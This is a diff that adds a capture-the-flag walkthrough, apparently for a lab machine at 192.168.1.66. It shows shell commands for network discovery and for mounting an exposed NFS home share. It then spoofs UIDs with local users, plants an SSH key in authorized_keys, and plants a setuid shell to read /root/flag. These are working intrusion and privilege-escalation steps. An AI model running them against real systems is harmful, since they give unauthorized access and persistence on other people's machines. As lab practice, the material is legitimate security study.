@@ -1,0 +1,38 @@
+# Discovery
+sudo arp-scan 192.168.1.0/24
+nmap 192.168.1.66
+mkdir -p ~/.local/tmp && cd ~/.local/tmp && mkdir -p nfs
+showmount -e 192.168.1.66
+sudo mount 192.168.1.66:/home/bob nfs
+
+# User abusing
+sudo useradd -u 1001 tc
+sudo useradd -u 2020 bob
+sudo usermod -a -G sudo bob
+sudo usermod -a -G sudo tc
+sudo passwd bob
+sudo passwd tc
+
+# Access to bob (ssh key)
+sudo su bob
+cd nfs && mkdir -p .ssh
+sudo cat /home/pierre/.ssh/id_rsa.pub > .ssh/authorized_keys
+exit
+ssh bob@192.168.1.66 # Let this session opened in another shell, because next
+                     # command will not allow to log anymore.
+
+# Access to tc (setuid)
+chmod ugo+rwx /home/bob
+cp /bin/sh /home/bob/sh
+# Return on local shell.
+cp nfs/sh . && rm nfs/sh
+sudo chown tc sh
+sudo su tc
+mv sh nfs
+chmod u+s nfs/sh
+exit
+
+# Get the flag
+# Return on SSH shell.
+./sh
+cat /root/flag
